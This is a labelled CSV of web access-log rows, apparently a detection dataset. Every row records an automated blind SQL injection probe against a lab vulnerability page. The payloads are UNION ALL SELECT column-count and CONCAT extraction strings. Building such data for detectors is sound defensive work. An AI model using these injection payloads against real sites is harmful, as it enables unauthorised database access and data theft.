ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,malicious
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4413%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2812%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9978%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4631%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9516%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9984%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2597%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3124%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x7162627a71%2C0x6b4372465055645151796d48446372497971745479614170716e715670534e45487375756e4e4a6f%2C0x7176766a71%29%2C55%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=1%27%20UNION%20ALL%20SELECT%2055%2CCONCAT%280x7162627a71%2C0x4955736e79677a4173457167454d6f774e4c4a4967736c42734750756a78547a514666495161436f%2C0x7176766a71%29%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x7162627a71%2C0x4574626b434c75544770%2C0x7176766a71%29%2C55%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=1%27%20UNION%20ALL%20SELECT%2055%2CCONCAT%280x7162627a71%2C0x456e524442544b5a6358%2C0x7176766a71%29%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-7455%27%20UNION%20ALL%20SELECT%20CONCAT%280x7162627a71%2C0x476b544454485359447257746f68444b684555495847466a42715751504e6877705965666f69627a%2C0x7176766a71%29%2C55%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4556%27%20UNION%20ALL%20SELECT%2055%2CCONCAT%280x7162627a71%2C0x6259624b4e4741727171675154585766445272496d724252525470786879796a4b5451544f7a6c79%2C0x7176766a71%29%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-1969%27%20UNION%20ALL%20SELECT%20CONCAT%280x7162627a71%2C0x6e734c44784f6b436b41%2C0x7176766a71%29%2C55%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4171%27%20UNION%20ALL%20SELECT%2055%2CCONCAT%280x7162627a71%2C0x5647506e6775686e546f%2C0x7176766a71%29%23&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-7153%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2430%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4981%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2067%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9683%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-1056%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3818%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-6008%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3089%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3967%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2924%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9939%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-6343%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3809%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-4069%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-5346%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-7605%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-7116%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3812%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-5231%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3897%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-7616%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-3182%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9469%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2049%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-2059%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-8886%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-6223%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-1722%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-5303%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-9672%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-5481%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
192.168.1.11,28/Feb/2021:19:28:12 -0400,/vulnerabilities/sqli_blind/?id=-1638%27%20UNION%20ALL%20SELECT%2055%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%2C55%23&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4,1
